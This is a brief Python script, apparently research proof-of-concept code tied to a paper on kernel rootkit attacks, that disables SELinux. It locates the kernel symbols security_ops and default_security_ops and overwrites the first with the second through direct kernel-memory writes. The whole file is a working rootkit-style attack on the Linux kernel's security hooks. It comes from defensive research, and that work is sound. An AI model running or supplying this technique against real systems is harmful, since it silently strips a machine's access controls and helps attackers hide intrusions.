#!/usr/bin/python

"""
Disable SE Linux using the attack described in
"Defeating Dynamic Data Kernel Rootkit Attacks
via VMM-based Guest-Transparent Monitoring"

Ryan Riley
rriley.cs@gmail.com
"""

import os, sys
from ctypes import *

from kstructs import *
from memreader import *
from symbolfinder import *

sf = SymbolFinder()
dm = DevMemReader(sf)

secops = sf.find("security_ops")
def_secops = sf.find("default_security_ops")

print hex(secops)
print hex(dm.read_int(secops))
print hex(def_secops)

dm.write(c_uint(def_secops), secops)

print hex(secops)
print hex(dm.read_int(secops))
print hex(def_secops)
